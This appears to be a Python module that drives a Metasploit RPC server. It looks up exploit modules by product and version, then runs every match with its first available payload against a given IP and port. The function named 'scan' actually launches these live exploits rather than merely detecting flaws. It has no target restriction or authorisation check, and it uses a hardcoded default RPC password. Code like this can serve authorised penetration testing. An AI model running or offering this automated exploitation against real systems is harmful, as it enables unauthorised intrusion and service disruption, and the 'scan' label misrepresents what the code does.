from pymetasploit3.msfrpc import MsfRpcClient

client = None


def connect(password="password", host="127.0.0.1", port=55553):
    global client
    client = MsfRpcClient(password, server=host, port=port)


def search_exploits(product, version):
    if client is None:
        return []
    results = client.modules.search(f"{product} {version}")
    return [r for r in results if r["type"] == "exploit"]


def run_exploit(ip, port, module_name):
    if client is None:
        return None
    exploit = client.modules.use("exploit", module_name)
    exploit["RHOSTS"] = ip
    exploit["RPORT"] = port
    payload = client.modules.use("payload", exploit.targetpayloads()[0])
    return exploit.execute(payload=payload)


def scan(ip, port, product, version):
    exploits = search_exploits(product, version)
    if not exploits:
        return []

    vulnerabilities = []
    for e in exploits:
        result = run_exploit(ip, port, e["fullname"])
        vulnerabilities.append({
            "name": e["name"],
            "module": e["fullname"],
            "result": result,
            "source": "metasploit"
        })

    return vulnerabilities
